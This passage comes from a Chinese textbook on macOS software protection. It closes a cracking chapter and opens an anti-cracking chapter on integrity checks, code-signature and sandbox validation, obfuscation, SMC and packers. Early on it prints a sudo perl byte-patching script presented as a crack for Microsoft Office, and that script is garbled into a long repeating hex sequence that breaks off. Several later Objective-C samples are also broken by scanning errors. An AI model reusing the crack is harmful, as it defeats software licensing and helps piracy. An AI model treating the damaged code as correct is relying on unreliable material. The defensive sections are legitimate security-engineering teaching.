使用本章介绍的技术成功破解软件后，就到了最后的成果发布阶段。最直接的方式是直接发布破解后的软件，对于目标程序较小的情况，这样的发布方式比较常见；如果目标程序较大，并且可以通过网上下载，那么不发布源程序，而是发布软件的破解补丁则会更加方便。还有一种情况完全是出于破解人员对成果展示的一种仪式感，他们会制作成界面精美的补丁程序，如图9-26所示。

 </div>

将要破解的目标程序直接拖放到补丁程序上，补丁程序就会补丁目标程序，然后对它进行重签名。

反汇编补丁程序，很容易找到软件破解者当初的破解思路，以及编写补丁的具体方法。因此，很多补丁制作人员为了防止自己的“成果”被他人窃去，会对补丁程序使用加密技术进行保护。另外，还有一些人会显得随意一些，会公开补丁程序的源代码，或者使用脚本编写补丁程序，使任何人都可以查看它的源代码。下面是早期macOS系统上Microsoft Office套件的破解补丁脚本。

echo "Patching Microsoft Office Outlook..."
sudo perl -i.bak -pe 's|\x00\x0F\xA3\xA1\xA2\xA3\xA4\xA5\xA6\xA7\xA8\xA9\xA10\xA11\xA12\xA13\xA14\xA15\xA16\xA17\xA18\xA19\xA20\xA21\xA22\xA23\xA24\xA25\xA26\xA27\xA28\xA29\xA30\xA31\xA32\xA33\xA34\xA35\xA36\xA37\xA38\xA39\xA40\xA41\xA42\xA43\xA44\xA45\xA46\xA47\xA48\xA49\xA50\xA51\xA52\xA53\xA54\xA55\xA56\xA57\xA58\xA59\xA60\xA61\xA62\xA63\xA64\xA65\xA66\xA67\xA68\xA69\xA70\xA71\xA72\xA73\xA74\xA75\xA76\xA77\xA78\xA79\xA80\xA81\xA82\xA83\xA84\xA85\xA86\xA87\xA88\xA89\xA90\xA91\xA92\xA93\xA94\xA95\xA96\xA97\xA98\xA99\xA100\xA101\xA102\xA103\xA104\xA105\xA106\xA107\xA108\xA109\xA110\xA111\xA112\xA113\xA114\xA115\xA116\xA117\xA118\xA119\xA120\xA121\xA122\xA123\xA124\xA125\xA126\xA127\xA128\xA129\xA130\xA131\xA132\xA133\xA134\xA135\xA136\xA137\xA138\xA139\xA140\xA141\xA142\xA143\xA144\xA145\xA146\xA147\xA148\xA149\xA150\xA151\xA152\xA153\xA154\xA155\xA156\xA157\xA158\xA159\xA160\xA161\xA162\xA163\xA164\xA165\xA166\xA167\xA168\xA169\xA170\xA171\xA172\xA173\xA174\xA175\xA176\xA177\xA178\xA179\xA180\xA181\xA182\xA183\xA184\xA185\xA186\xA187\xA188\xA189\xA190\xA191\xA192\xA193\xA194\xA195\xA196\xA197\xA198\xA199\xA200\xA201\xA202\xA203\xA204\xA205\xA206\xA207\xA208\xA209\xA210\xA211\xA212\xA213\xA214\xA215\xA216\xA217\xA218\xA219\xA220\xA221\xA222\xA223\xA224\xA225\xA226\xA227\xA228\xA229\xA230\xA231\xA232\xA233\xA234\xA235\xA236\xA237\xA238\xA239\xA240\xA241\xA242\xA243\xA244\xA245\xA246\xA247\xA248\xA249\xA250\xA251\xA252\xA253\xA254\xA255\xA256\xA257\xA258\xA259\xA260\xA261\xA262\xA263\xA264\xA265\xA266\xA267\xA268\xA269\xA270\xA271\xA272\xA273\xA274\xA275\xA276\xA277\xA278\xA279\xA280\xA281\xA282\xA283\xA284\xA285\xA286\xA287\xA288\xA289\xA290\xA291\xA292\xA293\xA294\xA295\xA296\xA297\xA298\xA299\xA300\xA301\xA302\xA303\xA304\xA305\xA306\xA307\xA308\xA309\xA310\xA311\xA312\xA313\xA314\xA315\xA316\xA317\xA318\xA319\xA320\xA321\xA322\xA323\xA324\xA325\xA326\xA327\xA328\xA329\xA330\xA331\xA332\xA333\xA334\xA335\xA336\xA337\xA338\xA339\xA340\xA341\xA342\xA343\xA344\xA345\xA346\xA347\xA348\xA349\xA350\xA351\xA352\xA353\xA354\xA355\xA356\xA357\xA358\xA359\xA360\xA361\xA362\xA363\xA364\xA365\xA366\xA367\xA368\xA369\xA370\xA371\xA372\xA373\xA374\xA375\xA376\xA377\xA378\xA379\xA380\xA381\xA382\xA383\xA384\xA385\xA386\xA387\xA388\xA389\xA390\xA391\xA392\xA393\xA394\xA395\xA396\xA397\xA398\xA399\xA400\xA401\xA402\xA403\xA404\xA405\xA406\xA407\xA408\xA409\xA410\xA411\xA412\xA413\xA414\xA415\xA416\xA417\xA418\xA419\xA420\xA421\xA422\xA423\xA424\xA425\xA426\xA427\xA428\xA429\xA430\xA431\xA432\xA433\xA434\xA435\xA436\xA437\xA438\xA439\xA440\xA441\xA442\xA443\xA444\xA445\xA446\xA447\xA448\xA449\xA450\xA451\xA452\xA453\xA454\xA455\xA456\xA457\xA458\xA459\xA460\xA461\xA462\xA463\xA464\xA465\xA466\xA467\xA468\xA469\xA470\xA471\xA472\xA473\xA474\xA475\xA476\xA477\xA478\xA479\xA480\xA481\xA482\xA483\xA484\xA485\xA486\xA487\xA488\xA489\xA490\xA491\xA492\xA493\xA494\xA495\xA496\xA497\xA498\xA499\xA400\xA401\xA402\xA403\xA404\xA405\xA406\xA407\xA408\xA409\xA410\xA411\xA412\xA413\xA414\xA415\xA416\xA417\xA418\xA419\xA420\xA421\xA422\xA423\xA424\xA425\xA426\xA427\xA428\xA429\xA430\xA431\xA432\xA433\xA434\xA435\xA436\xA437\xA438\xA439\xA440\xA441\xA442\xA443\xA444\xA445\xA446\xA447\xA448\xA449\xA450\xA451\xA452\xA453\xA454\xA455\xA456\xA457\xA458\xA459\xA460\xA461\xA462\xA463\xA464\xA465\xA466\xA467\xA468\xA469\xA470\xA471\xA472\xA473\xA474\xA475\xA476\xA477\xA478\xA479\xA480\xA481\xA482\xA483\xA484\xA485\xA486\xA487\xA488\xA489\xA490\xA491\xA492\xA493\xA494\xA495\xA496\xA497\xA498\xA499\xA400\xA401\xA402\xA403\xA404\xA405\xA406\xA407\xA408\xA409\xA410\xA411\xA412\xA413\xA414\xA415\xA416\xA417\xA418\xA419\xA420\xA421\xA422\xA423\xA424\xA425\xA426\xA427\xA428\xA429\xA430\xA431\xA432\xA433\xA434\xA435\xA436\xA437\xA438\xA439\xA440\xA441\xA442\xA443\xA444\xA445\xA446\xA447\xA448\xA449\xA450\xA451\xA452\xA453\xA454\xA455\xA456\xA457\xA458\xA459\xA460\xA461\xA462\xA463\xA464\xA465\xA466\xA467\xA468\xA469\xA470\xA471\xA472\xA473\xA474\xA475\xA476\xA477\xA478\xA479\xA480\xA481\xA482\xA483\xA484\xA485\xA486\xA487\xA488\xA489\xA490\xA491\xA492\xA493\xA494\xA495\xA496\xA497\xA498\xA499\xA400\xA401\xA402\xA403\xA404\xA405\xA406\xA407\xA408\xA409\xA410\xA411\xA412\xA413\xA414\xA415\xA416\xA417\xA418\xA419\xA420\xA421\xA422\xA423\xA424\xA425\xA426\xA427\xA428\xA429\xA430\xA431\xA432\xA433\xA434\xA435\xA436\xA437\xA438\xA439\xA440\xA441\xA442\xA443\xA444\xA445\xA446\xA447\xA448\xA449\xA450\xA451\xA452\xA453\xA454\xA455\xA456\xA457\xA458\xA459\xA460\xA461\xA462\xA463\xA464\xA465\xA466\xA467\xA468\xA469\xA470\xA471\xA472\xA473\xA474\xA475\xA476\xA477\xA478\xA479\xA480\xA481\xA482\xA483\xA484\xA485\xA486\xA487\xA488\xA489\xA490\xA491\xA492\xA493\xA494\xA495\xA496\xA497\xA498\xA499\xA400\xA401\xA402\xA403\xA404\xA405\xA406\xA407\xA408\xA409\xA410\xA411\xA412\xA413\xA414\xA415\xA416\xA417\xA418\xA419\xA420\xA421\xA422\xA423\xA424\xA425\xA426\xA427\xA428\xA429\xA430\xA431\xA432\xA433\xA434\xA43

这段脚本程序使用系统内置的命令行工具perl，在目标程序中查找特征代码并进行替换，破解完成后，执行codesign -f -s -对程序进行重签名，签名的identity设置为-，表示使用adhoc进行重签名。

与补丁程序类似的还有注册机（又称为Keygen），在很多破解软件的压缩包里经常会看到破解组织发布的注册机。图9-27所示是CORE组织发布的一款App的注册机。

 </div>

注册机编写体现了软件破解的最高水准，是每一个软件破解者努力的目标。有兴趣的读者可以为本章前面几节的程序编写注册机。

### 9.7 本章小结

本章首先讨论了常见的软件保护类型，分析探讨了它们的破解方法，接着介绍了软件Hook与注入技术，这些技术在本质上是通用的，在Windows、Linux以及其他平台上，都可以看到这类软件破解技术。本章只是针对性地讲解了macOS平台相关技术的实现方法与工具。读者掌握了这些技术后，以后做其他系统平台的软件安全研究时，要能够触类旁通，自己摸索掌握相关的技术。

# 反破解技术

软件破解技术是逆向分析人员最感兴趣的内容，本章讲解的软件反破解技术，更多的是关注软件安全开发。破解技术与反破解技术是相对的，破解技术发展后，就会有相应的反破解技术出现；反破解技术的出现，又会促使破解人员去寻找新的破解方法。本章涉及的反破解技术都是目前已经公开或者在其他系统平台使用比较广泛的技术。

### 10.1 反破解技术类型

软件反破解一直是软件开发人员关心的话题。对于大多数开发人员而言，如何开发软件比如何防止软件被破解要简单得多。市面上专业讲解软件安全知识的书比较少见，如何加强自身软件的安全性，只能靠开发人员独自摸索。本章试图从以下几个方面来讲解软件开发人员可能使用到的反破解技术。

☐ 校验保护。校验保护主要是保护软件的完整性，被破解的软件与原软件相比，最明显的区别就是其完整性遭到了破坏。检测软件是否完整，就能知道软件是否被破解篡改了。

代码保护。破解人员拿到软件后，第一时间就是拿反汇编分析工具对软件二进制反汇编代码进行分析，提高软件分析的门槛与反汇编代码的难度，可以大大提高破解人员的分析成本，甚至将大量的初级破解人员拦在门外。

口 数据保护。软件会与各种各样的数据打交道，对于软件中使用到的敏感数据，合理地使用与存储它们，也是十分重要的。

口 调试器对抗。破解人员为了掌握软件流程或查找关键代码，可能会用到动态调试技术。在软件中加入反调试功能，可以在很大程度上防止程序被恶意调试。

☐ Hook检测。如何函数被Hook了，那代码执行的流程就会受到篡改破坏，这不是软件开发人员希望看到的结果，在软件代码中加上Hook检测十分有必要。

☐ 注入检测。与Hook一样，软件在运行时有可能被注入了外部动态库，软件在运行时应该能够察觉并阻止它们。

### 10.2 校验保护

被破解的软件主要是它的主程序被破解。因此，软件在运行时，检测主程序是否被篡改，就可以判断软件是否被破解了。检测篡改的方法有完整性检查与代码签名验证：破解后的软件，它们的文件哈希值（比如MD5、SHA1）是发生了变化的。可以在软件生成的时候，把它们的哈希值在本地或网络服务器上保存一份，在软件运行的时候做比对即可；另一种校验检测的方法是检测软件的代码签名，这主要针对包含代码签名的软件，如果在软件运行时发现没有代码签名，或者与自己的代码签名不同，那软件一定是被破解了。

#### 10.2.1 完整性检查

上一章的whoisshe与crackme_net程序就包含了完整性检测的代码，Swift代码片段如下：

let mainBundle = NSBundle.mainBundle()

let exeurl = mainBundle.executableURL!
let filedata = NSData(contentsOfURL: exeurl)
let hash = filedata!.md5().toHexString()
NSLog("file hash:" + hash)
.....

这段代码通过 NSBundle 的 mainBundle() 方法获取到主程序的Bundle 对象，通过它的 executableURL 属性来获取它的URL路径，然后调用md5() 方法获取它的MD5值。该方法是NSData 的一个扩展，由第三方的CryptoSwift库实现。

获取此值后，可以将它与网络上的MD5值做比较，上一章的crackme_net程序就是这样做的。具体实现，读者可以参看它的代码，此处不再赘述。

#### 10.2.2 代码签名验证

苹果系统在很多地方都依赖代码签名: App Store 中不同软件的开发商是谁？系统中运行的软件是否安全可信任？这些技术的底层都依赖于代码签名技术。代码签名可以用来检测软件的完整性，判断程序是否损坏或被篡改，同时比对代码签名中的证书信息，也可以用于身份识别。苹果系统向开发人员提供了代码签名检查的 API 接口，开发人员可以在代码中很方便地调用这些接口，检查自身的代码签名是否被破坏。

请看如下函数的代码：

BOOL checkCodeSign(NSString *exefilePath) {
    SecStaticCodeRef ref = NULL;
    NSURL *url = [NSURL URLWithString: exefilePath];
    OSStatus status = SecStaticCodeCreateWithPath((__bridge CFURLRef)url, kSecCSDefaultFlags, &ref);
    if (ref == NULL) {
        NSLog(@"SecStaticCodeRef is nil");

if (status != noErr) {
    NSLog(@"SecStaticCodeCreateWithPath function return error");
    return FALSE;
} else {
    //NSLog(@"the SecStaticCodeRef is [%@]" , ref);
}

CFDictionaryRef dictRef = nil;
status = SecCodeCopySigningInformation(ref, kSecCSSigningInformation, &dictRef)
if (status != noErr) {
    NSLog(@"SecCodeCopySigningInformation function return error");
    return FALSE;
}

if (nil == dictRef) {
    NSLog(@"dictRef is nil");
    return FALSE;
} else {
    //NSLog(@"the dict is [%@]" , dictRef);
}

SecRequirementRef req = NULL;
status = SecRequirementCreateWithString(
    CFSTR("anchor apple or anchor apple generic"),
    kSecCSDefaultFlags, &req);
if (status != noErr) {
    NSLog(@"SecRequirementCreateWithString function return error");
    return FALSE;
}

if (req == NULL) {
    NSLog(@"req is nil");
    return FALSE;
} else {
    //NSLog(@"the req is [%@]" , req);
}

status = SecStaticCodeCheckValidity(ref, kSecCSCheckAllArchitectures, req);
CFRelease(ref);
CFRelease(req);
switch (status) {
    case errSecSuccess:
        NSLog(@"signature OK");
        return TRUE;
        break;
    case errSecCSUnsigned:
        NSLog(@"errSecCSUnsigned");
        break;
    case errSecCSSignatureFailed:
        case errSecCSSignatureInvalid:
            NSLog(@"signature error");
            break;
    case errSecCSSignatureNotVerifiable:
        NSLog(@"signature not verifiable");
    break;
}

case errSecCSSignatureUnsupported:
NSLog(@"signature unsupported");
break;
default:
NSLog(@"[%@](status);
NSLog(@"signature state error");
break;
}
return FALSE;
}

checkCodeSign()方法传入一个可执行文件的完整路径参数，然后检查它的代码签名，成功则返回true，否则返回false。该函数完成代码签名检查主要依赖函数SecStaticCodeCheckValidity()，它包含以下3个参数。

SecStaticCodeRef。它是结构体SecStaticCode的引用，表示位于磁盘上的已经签名过的代码。除此之外，还有一个SecCodeRef类型，是结构体SecCode的引用，它们的区别在于，SecCodeRef表示的是运行在系统中的已签名的代码，而SecStaticCodeRef则是磁盘上的。很多时候，前者类型的参数可以直接隐式转换成后者使用，它的底层实际上是调用SecCodeCopyStaticCode()来完成的。

☐ SecCSFlags。需要检查的代码签名的标志参数。

☐ SecRequirementRef。它是结构体SecRequirement的引用，表示一个Code Requirement数据。

第1个参数SecStaticCodeRef使用SecStaticCodeCreateWithPath()返回，该API传入要查询的文件的URL路径，会返回一个它的已签名代码结构的引用；第2个参数通常传入kSecCSCheck-AllArchitectures，表示检查所有的架构下的代码签名；第3个参数SecRequirementRef由SecRequirementCreateWithString()返回，该API通过字符串信息创建一个Code Requirement，这里的参数取值为anchor apple or anchor apple generic，表示创建的Code Requirement是来自苹果公司签名的（苹果公司签名的程序，如系统内置程序），或者第三方发布的可信证书签名的（苹果颁发证书签名的，如App Store内的应用与Developer ID签名的应用）。关于如何构造该字符串，详见苹果开发文档“Code Signing Guide”中的“Code Signing Requirement Language”一节。

SecStaticCodeCheckValidity()返回一个OSStatus类型的结果，如果返回noErr，表示代码签名检查成功；如果出错，则会返回其他的值，部分值如下。

□ errSecSuccess: 成功，没有错误。

☐ errSecCSUnsigned: 代码没有签名。

□ errSecCSSignatureFailed: 代码签名错误。

□ errSecCSSignatureInvalid：代码签名无效。

□ errSecCSSignatureNotVerifiable：代码签名不可验证。

☐ errSecCSSignatureUnsupported：不支持的签名信息。

   </div>

可以使用另一个SecStaticCodeCheckValidityWithErrors()来完成同样的代码签名检查的工作，它的返回结果同样是OSStatus类型，只是多出了一个errors参数用来接收错误信息。

使用SecStaticCodeCheckValidity()等API只能检测代码签名是否有效，如果破解人员使用有效的证书进行重签名，那返回的结果也会是true，因此有必要对代码签名中的信息进行手动验证。

获取代码签名信息使用SecCodeCopySigningInformation()，它的原型如下：

OSStatus SecCodeCopySigningInformation (SecStaticCodeRef code, SecCSFlags flags, CFDictionaryRef_Nullable *information);

SecCSFlags传递kSecCSSigningInformation就会通过第3个参数CFDictionaryRef返回代码签名信息。返回的信息是一个字典结构，可以使用CFDictionaryGetValue()来查看具体的数据内容，该函数原型如下：

const void * CFDictionaryGetValue(CFDictionaryRef theDict, const void *key);

第1个参数是上一步获取到的字典，第2个key参数是需要获取的数据类型，SDK中已经有一系列定义好的值，如下所示：

extern const CFStringRef kSecCodeInfoCertificates; /* Signing */
extern const CFStringRef kSecCodeInfoChangedFiles; /* Content */
extern const CFStringRef kSecCodeInfoCMS; /* Signing */
extern const CFStringRef kSecCodeInfoDesignatedRequirement; /* Requirement */
extern const CFStringRef kSecCodeInfoEntitlements; /* Requirement */
extern const CFStringRef kSecCodeInfoEntitlementsDict; /* Requirement */
extern const CFStringRef kSecCodeInfoFlags; /* generic */
extern const CFStringRef kSecCodeInfoFormat; /* generic */
extern const CFStringRef kSecCodeInfoDigestAlgorithm; /* generic */
extern const CFStringRef kSecCodeInfoDigestAlgorithms; /* generic */
extern const CFStringRef kSecCodeInfoPlatformIdentifier; /* generic */
extern const CFStringRef kSecCodeInfoIdentifier; /* generic */
extern const CFStringRef kSecCodeInfoImplicitDesignatedRequirement; /* Requirement */
extern const CFStringRef kSecCodeInfoMainExecutable; /* generic */
extern const CFStringRef kSecCodeInfoPList; /* generic */
extern const CFStringRef kSecCodeInfoRequirements; /* Requirement */
extern const CFStringRef kSecCodeInfoRequirementData; /* Requirement */
extern const CFStringRef kSecCodeInfoSource; /* generic */
extern const CFStringRef kSecCodeInfoStatus; /* Dynamic */
extern const CFStringRef kSecCodeInfoTeamIdentifier; /* Signing */
extern const CFStringRef kSecCodeInfoTime; /* Signing */
extern const CFStringRef kSecCodeInfoTimestamp; /* Signing */
extern const CFStringRef kSecCodeInfoTrust; /* Signing */
extern const CFStringRef kSecCodeInfoUnique; /* generic */
extern const CFStringRef kSecCodeInfoCdHashes; /* generic */

如何获取这个值呢？还记得前面介绍的如何查看一个软件的代码签名信息吗？命令如下：

$ codesign -d -vv /Applications/Thunder.app
Executable=/Applications/Thunder.app/Contents/MacOS/Thunder
Identifier=com.xunlei.Thunder
Format=app bundle with Mach-0 thin (i386)
CodeDirectory v=20200 size=15378 flags=0x0(none) hashes=474+4 location=embedded

Signature size=4648
Authority=Developer ID Application: Xunlei Networking Technologies, Ltd (EQ77XF98J8)
Authority=Developer ID Certification Authority
Authority=Apple Root CA
Signed Time=Jun 2, 2016, 15:57:20
Info.plist entries=29
TeamIdentifier=EQ77XF98J8
Sealed Resources version=2 rules=12 files=551
Internal requirements count=1 size=180

执行codesign-d-vv命令，可以返回软件的签名与证书信息。在输出的信息中，每一条对应的就是上面key参数不同的类型值。如kSecCodeInfoMainExecutable对应的就是Executable一项的值，kSecCodeInfoIdentifier对应的就是Identifier一项的值，kSecCodeInfoFormat对应的就是Format一项的值。如果我们是迅雷公司的开发人员，从输出的信息中，检测代码签名Authority=DeveloperID Application: Xunlei Networking Technologies, Ltd (EQ77XF98J8)这一项，效果显然是最好的。Authority是证书链中的一项，对应的是kSecCodeInfoCertificates。下面的代码展示了如何获取代码签名中第一项证书的信息：

NSString *getCertSummaryFromFile(NSString *exeFilePath) {
    NSString *ret = @@";
    SecStaticCodeRef ref = NULL;
    NSString *urlStr = [[NSString alloc] initWithFormat: @"file://%@", ex日に);
    NSURL * url = [[NSURL alloc] initWithString: urlStr];
    OSStatus status = SecStaticCodeCreateWithPath((__bridge CFURLRef)url, kSecCSDefaultFlags, &ref)
    if (noErr != status || NULL == ref) {
        NSLog(@"code create path error");
        return ret;
    }

    CFDictionaryRef dictRef = NULL;
    status = SecCodeCopySigningInformation(ref, kSecCSSigningInformation, &dictRef);
    if (noErr != status || NULL == dictRef) {
        NSLog(@"dict is nil");
        return ret;
    }

    NSArray *cerArray = (NSArray *)CFDictionaryGetValue(dictRef, kSecCodeInfoCertificates);
    if (nil == cerArray || 0 == [cerArray count]) {
        NSLog(@"cert is nil");
        return ret;
    }

    SecCertificateRef cert = (_bridge SecCertificateRef)[cerArray firstObject];
    CFStringRef subjectSummary = SecCertificateCopySubjectSummary(cert);

    return (__bridge NSString *)subjectSummary;
}

执行本节的checksign程序，分别检查本机迅雷（如果有安装的话）与系统文本编辑器的代码签名，输出信息如下：

$./checksign file:///Applications/TextEdit.app/Contents/MacOS/TextEdit
signature OK
subject summary is Software Signing
$./checksign file:///Applications/Thunder.app/Contents/MacOS/Thunder
signature OK
subject summary is Developer ID Application: Xunlei Networking Technologies, Ltd (EQ77XF98J8)

可以看出,系统程序的证书subject summary是“Software Signing”,第三方程序则是“Developer ID Application”。

#### 10.2.3 沙盒检测

苹果公司要求在App Store上发布的程序必须沙盒化。如果软件被破解,代码签名就会被修改,而程序中的沙盒信息也可能会被破坏。

新建一个名为testSandbox的Cocoa程序，生成项目后，直接编译生成testSandbox.app，然后将其改名为testSandbox_src.app。接着在项目的Capabilities标签中开启App Sandbox，在权限中开启Network:Outgoing Connections(Client)与Hardware:USB，如图10-1所示。

 </div>

再次编译生成`testSandbox.app`，将两次生成的程序使用目录比较工具进行差异对比。这里使用的是`Beyond Compare①`，经过比较两个程序的主要差别体现在生成的`testSandbox`二进制文件中，如图10-2所示。

 </div>

再来看看高亮的不同点位于MachO文件结构的哪个位置，这里使用010 Editor配合MachO文件模板查看，效果如图10-3所示。

 </div>

对应的位置为程序代码签名部分的Entitlement结构体，它的数据内容为plist格式的xml文本，可以提取出来查看它的内容，如下所示：

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
<key>com.apple.security.device.usb</key>
<true/>
<key>com.apple.security.network.client</key>
<true/>
</dict>
</plist>

com.apple.security.app-sandbox表示程序开启了沙盒，com.apple.security.device.usb与com.apple.security.network.client正是上面开启的两个沙盒权限。由此可见，开启沙盒的程序，就是在程序的代码签名部分注入了权限信息。

为了验证上面的分析，我们把从App Store中下载的文本编辑器CotEditor与迅雷官方下载的Thunder做比较，来看看它们之间的区别。检查它们代码签名部分的Entitlement信息，执行如下命令：

$ codesign --display --entitlements - /Applications/CotEditor.app
Executable=/Applications/CotEditor.app/Contents/MacOS/CotEditor
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.application-identifier</key>
<string>HT3Z3A72WZ.com.coteditor.CotEditor</string>
<key>com.apple.developer.aps-environment</key>
<string>production</string>
<key>com.apple.developer.team-identifier</key>
<string>HT3Z3A72WZ</string>
<key>com.apple.security.app-sandbox</key>
<true/>
<key>com.apple.security.files.user-selected.executable</key>
<true/>
<key>com.apple.security.files.user-selected.read-write</key>
<true/>
<key>com.apple.security.print</key>
<true/>
</dict>
</plist>
$ codesign --display --entitlements - /Applications/Thunder.app
Executable=/Applications/Thunder.app/Contents/MacOS/Thunder

从输出结果可以看出，沙盒化后的CotEditor程序会有Entitlement信息，而没有沙盒化的Thunder则没有，与上面的分析结果是一样的。

总结来看，Entitlement是一个plist格式的文件，其中的每个键值对都是一项沙盒权限的声明，每个沙盒化后的程序，com.apple.security.app-sandbox项的值都必须存在。因此，检测沙盒化程序的方法就可以是检测程序代码签名Entitlement部分这项值是否存在，如果存在就说明程序开启了沙盒。

系统提供了 API 接口 SecRequirementCreateWithString 来查看程序的 Entitlement 信息，可编写如下代码检查沙盒是否开启：

BOOL checkSandbox(NSString *exefilePath) {
    BOOL isSandboxed = NO;
    if (checkCodeSign(exefilePath)) {
        SecStaticCodeRef ref = NULL;
        NSURL *url = [NSURL URLWithString: exefilePath];
        OSStatus status = SecStaticCodeCreateWithPath((__bridge CFURLRef)url, kSecCSDefaultFlags, &ref);
        if (ref == NULL) {
            NSLog(@"SecStaticCodeRef is nil");
            return FALSE;
        }
        if (status != noErr) {
            NSLog(@"SecStaticCodeCreateWithPath function return error");
            return FALSE;
        } else {
            //NSLog(@"the SecStaticCodeRef is [%@]" , ref);
        }
        static SecRequirementRef req = NULL;
        SecRequirementCreateWithString(
            CFSTR("entitlement[\"com.apple.security.app-sandbox\"] exists"),
            kSecCSDefaultFlags, &req);
        if (req) {
            OSStatus codeCheckResult = SecStaticCodeCheckValidityWithErrors(ref,
                                     kSecCSBasicValidateOnly, req, NULL);
            if (codeCheckResult == errSecSuccess) {
                isSandboxed = YES;
            }
            CFRelease(req);
        }
        CFRelease(ref);
    }
    return isSandboxed;
}

沙盒化后的程序必须是经过代码签名的，首先使用上一节的checkCodeSign()检测它的代码签名是否有效，如果有效，就调用SecRequirementCreateWithString()创建一个Code Requirement。注意这次传入的参数字符串为entitlement[\"com.apple.security.app-sandbox\"] exists"，表示该沙盒化选项必须要存在，最后，调用SecStaticCodeCheckValidityWithErrors()来验证是否有效。

运行本节的checksandbox来查看迅雷与系统的文本编辑器是否已经沙盒化，输出如下：

$./checksandbox file:///Applications/Thunder.app/Contents/MacOS/Thunder signature OK
not sandbox app.
$./checksandbox file:///Applications/TextEdit.app/Contents/MacOS/TextEdit signature OK
sandboxed.

#### 10.2.4 来源检测

如果开发的程序是在App Store上发布的，那么可以检查它的本地Receipt信息是否存在，从而判断程序是否来自App Store。检测的代码在上一章已经讲过，片段如下：

- (BOOL) isFromAppStore {
    NSURL *receiptURL = [[NSBundle mainBundle] appStoreReceiptURL];
    if (![[NSFileManager defaultManager] fileExistsAtPath:[receiptURL path]])
    {
        return FALSE;
    }
    return TRUE;
}

### 10.3 代码保护

在逆向分析程序时，分析人员开展工作的入口主要有：字符串、符号名称与反汇编代码。查找符号特征，定位关键代码，基本都要依赖这些比较直观的信息。代码保护的目的主要就是对这些信息进行保护，增强软件逆向分析的难度。

#### 10.3.1 代码混淆

不同语言生成的代码特性不同，代码保护的方法也不一样。在安卓平台上，主要使用Java语言与C/C++语言来开发程序，代码保护的技术也普遍围绕这两种语言展开。对于Java语言，已经有很成熟的代码混淆工具。在安卓开发的SDK内，就有内置代码自动混淆工具Proguard。在编译打包apk的时候，程序的代码就自动完成了混淆。Proguard这类工具针对的是Java语言开发的程序，不是针对独立的操作系统，而且Java语言又是跨平台的，因此，这类工具也可以对macOS平台上开发的软件进行代码混淆。其实，使用Java语言开发的程序在macOS系统上并不少见，JetBrains公司开发的全系列软件产品都是基于Java的。如果开发人员确定使用Java语言作为软件的主要开发语言，不妨试试这类跨平台的Java代码混淆工具。对于C/C++语言编写的代码，主要的代码保护手段就是代码混淆、SMC与软件加密壳保护。这些技术本身是没有系统平台限制的，掌握了一种平台的相关技术，开发跨平台的代码保护工具不是太难的事情。

在macOS系统上，主要使用Objective-C与Swift语言开发软件，而苹果公司并没有提供直接针对这两种语言的代码保护方案与工具。一些公开的代码反逆向工程措施，都是聪明的开发人员与

安全研究人员努力的成果。

首先，拿Objective-C语言来说，基于它的代码混淆，比较容易实现的是对符号名称的混淆。网上有安全研究人员开发出一个全自动化的代码混淆工具Camo $ ^{①} $。Camo程序搜索源代码目录，找出所有Objective-C代码中的类名、方法名、属性名的符号，然后把这些名称使用#define重定义成随机的名称，写到一个.h文件中，并加入预处理头文件。这样每次代码重新编译程序，就会对所有的符号进行混淆。另外，关于如何手动完成代码混淆，网上也有安全研究人员写了详细的手法 $ ^{②} $。

Swift语言的代码混淆与Objective-C不一样，Swift语言不支持#define指令，不过可以使用let关键字进行模拟，虽然麻烦一些，也没这么优雅，不过可以达到类似的效果。有兴趣的读者，可以参看Camo的源代码自己编写一个Swift语言的自动化码混淆工具。

#### 10.3.2 SMC

SMC是SelfModifying Code的缩写，即自修改代码。SMC程序的主要特点是在运行时动态修改自己的数据。如果将程序拿到反汇编工具中查看，基本看不出什么信息。这类程序在执行时会在内存中动态解密数据与代码，程序跑起来初始化完成后，加密的数据与代码会在内存中解密完毕。根据实现的不同，SMC可以针对个别具有重要功能的函数，也可以加密整个代码段。由于它加载初始化完成即解密完成的特点，通常该技术会配合代码反调试一起使用，这样在程序破解难度上会大大提高。知名的反汇编软件Hopper在自身的软件保护上就大量地使用了SMC技术。

需要注意的是，App Store中上架的程序是不允许使用隐秘加密技术的。因此，SMC技术不适合打算上架App Store的应用。只能通过第三方渠道分发软件，具有Developer ID开发者证书的人员才能使用。

#### 10.3.3 代码校验

代码校验技术在Windows平台的加密壳上使用广泛。采用这种技术加密过的程序的特点是：运行时开启单独的线程动态校验运行的代码，如果代码被修改了就会运行异常。这种保护方式运用于代码防补丁与动态调试上。在macOS平台上运行的Hopper反汇编工具v3版本中，也使用到了这种技术，采用插件与注入动态库方式对Hopper进行动态补丁，程序在执行一些核心操作时，就会异常退出。

#### 10.3.4 壳保护

软件外壳保护技术起源于DOS时代，由于Windows系统平台的市场占有率比较大，软件安全

   </div>

研究人员早期的研究主要针对Windows平台。Windows XP时代，软件加解密技术非常流行，软件外壳技术就是在此时发展起来的。之所以取名为“壳”，是因为加密后的程序通常整体经过压缩或加密，软件自身的内容需要在内存中解压解密后才能正常运行，加密代码位于软件的外层，就像昆虫的茧一样，牢牢地保护“壳”中的自己。

软件壳根据功能分为压缩壳与加密壳，单纯的压缩壳只是为了缩减原程序的大小，核心都放在了压缩算法的压缩比与解密速度上；加密壳注重代码加密，主要用于防止软件被逆向工程分析，在对抗静态分析与动态调试上都比压缩壳强出太多。复合型的加密壳也带有代码压缩功能，这类壳相对来说更为复杂。传统的加密壳经过几次技术上的迭代更新后，演变成了更加高级、加密强度更大的虚拟机执行壳（简称为虚拟机壳），这类壳模拟计算机处理器的指令集系统，使用自身的指令系统模拟替代原指令集。经过虚拟机壳处理过的代码，程序的体积与代码的流程都增加了不多，运行速度也变慢了许多，相应地，软件安全强度也提高了一个级别。目前，在Windows系统上，虚拟机壳已经十分稳定成熟了。

